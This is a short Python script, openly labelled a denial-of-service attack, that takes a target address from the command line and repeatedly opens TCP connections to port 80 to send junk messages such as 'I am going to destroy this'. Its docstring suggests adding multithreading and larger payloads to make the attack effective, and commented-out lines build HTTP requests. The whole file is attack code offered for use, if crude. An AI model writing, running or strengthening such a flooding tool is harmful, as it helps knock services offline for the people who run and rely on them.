import socket, sys, os

"""
Very light attack, Multithreading is needed and increase data size Then good to go@!
"""


print('DoS attacking on '+sys.argv[1] + ":: ")

def dosattack():
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 80))
    #s.send("GET /"+str(sys.argv[1])+" HTTP/1.1\r\n")
    #s.send("Host: "+str(sys.argv[1]) + "\r\n\r\n")
    s.send(b'hlo, I am going to destroy this')
    s.send(b'how, It is simple.')
    s.close()
    print("Attacking "+sys.argv[1])

for i in range(1, 10000):
    dosattack()
